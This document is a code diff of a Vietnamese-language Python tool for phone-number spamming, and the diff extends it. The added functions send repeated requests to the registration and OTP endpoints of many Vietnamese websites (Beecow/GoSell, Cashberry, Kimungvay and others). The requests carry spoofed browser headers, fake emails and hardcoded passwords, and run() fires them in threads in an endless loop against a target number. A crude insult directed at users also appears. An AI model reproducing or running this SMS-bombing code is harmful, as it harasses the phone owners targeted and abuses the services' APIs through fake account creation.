+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'time-zone': 'Asia/Saigon',
+    'origin': 'https://admin.gosell.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://admin.gosell.vn/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+}
+  data = '{"password":"12345ccok@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"sdt"}}'.replace('sdt',sdt)
+  response = requests.post('https://api.beecow.com/api/register/gosell', headers=headers, data=data).text
+def cashberry(sdt):
+  letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
+           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
+  random1 = random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters)
+  for x in random1:
+    a = x+"@gmail.com" 
+  headers = {
+    'Host': 'cashberry.vn',
+    # 'content-length': '1170',
+    'accept': 'application/json, text/plain, */*',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'origin': 'https://cashberry.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://cashberry.vn/dang-ky',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': 'cashberry_new_nuxt_front=vn; site_id=1f21f685be4e9ac1d9dde54d64a5ee30; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=wLU0zLsWJMCSuaFRsEAMR9lS8ymsmsZlauYDdKY58gA=; _ga=GA1.1.453475758.1691890639; _fbp=fb.1.1691890639098.1672690554; _lr_hb_-bdwvky%2Fcashberry-vn={%22heartbeat%22:1691890639757}; _lr_uf_-bdwvky=6e4dc5a7-23fc-4687-9efe-b0d1ea7ebdf2; _lr_tabs_-bdwvky%2Fcashberry-vn={%22sessionID%22:0%2C%22recordingID%22:%225-5d2ee190-bf44-4420-bbcf-69d94bc1229c%22%2C%22webViewID%22:null%2C%22lastActivity%22:1691890645656}; _ga_53M1222GXQ=GS1.1.1691890638.1.1.1691890649.0.0.0',
+}
+  data = '{"phone":"sdt","inn":"583805682558","email":"email11","password":"12345Gdtg@","password_repeat":"12345Gdtg@","agree":true,"is_confirmed_kyivstar":1,"email_mailing":1,"registrationActionsReport":{"Object_1":{"Keypress":null,"Activate":1,"TimeLast":3,"TimeAll":60,"SymbolFact":10,"Copy":null,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":17},"Object_2":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":19,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":4},"Object_3":{"Activate":1,"TimeLast":6,"TimeAll":6,"SymbolFact":10,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":null},"Object_15":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":null,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":null},"Object_41":{"Activate":null,"Changes":null,"Error":null}}}'.replace('email11',a)
+  data = data.replace('sdt',sdt)
+  response = requests.post('https://cashberry.vn/proxy/user/register', headers=headers, data=data).text
+
+def kimungvay(sdt):
+  headers = {
+    'Host': 'api.kimungvay.co',
+    # 'content-length': '73',
+    'accept': 'application/json, text/plain, */*',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://h5.kimungvay.site',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://h5.kimungvay.site/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+}
+
+  data = {
+    'phone': f'{sdt}',
+    'type': '2',
+    'ctype': '1',
+    'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
+}
+  response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data).text
 
 def xoa(text):
     sys.stdout.write('\r' + text)
@@ -1227,118 +1470,122 @@ def idelay(o):
 
 
 def run(sdt,i):
+  threading1.submit(regthantaioi,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(sapo,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(onecredit,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(y360,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(tv360,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(winmart,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(apispam,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(vieon,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(poyeye,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(alfrescos,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(fpt,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
-  threading1.submit(kiot,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)# ok
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(kiot,sdt) # ok
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(vayvnd,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(viettel,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(tamo,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(meta,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(funring,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(dkvt,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(fptplay,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(vietid,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(phamacy,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(y360rs,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(concung,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(appota,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(pizzacompany,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(best_inc,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(shopiness,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(ghn,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(chotot,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
   threading1.submit(cashbar,sdt)
-  print("\033[92m\033[1mSpam thành công lần thứ: ",i+1)
-  idelay(3)
-  time.sleep(3)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(ubofood,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(bibabo,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(itaphoa,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(findo,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(beecow,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(cashberry,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(takomo,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(kimungvay,sdt)
+  print(f"{xanh_la}Spam thành công")
+  time.sleep(1)
+  threading1.submit(thantaioi)
+  print(f"{xanh_la}Spam thành công")
 #=========================================================================================================================================================
 #==================================================================================================================================================================
 def check_put_method(url):
@@ -3328,7 +3575,6 @@ def main():
     print(f"Đang spam số {sdt}")
     i = 0
     while True:
-      i += 1
       run(sdt, i)
     if sdt == "0359489322":
         print("\033[91mSài tool tao thì spam cc số tao nha con chó\033[0m")
@@ -4096,7 +4342,7 @@ def main():
     Z.send_captcha()
     while True:
         try: 
-            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}[Trọng Thảo]</.>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
+            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
         except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)
 
   elif nhap == '5.1':
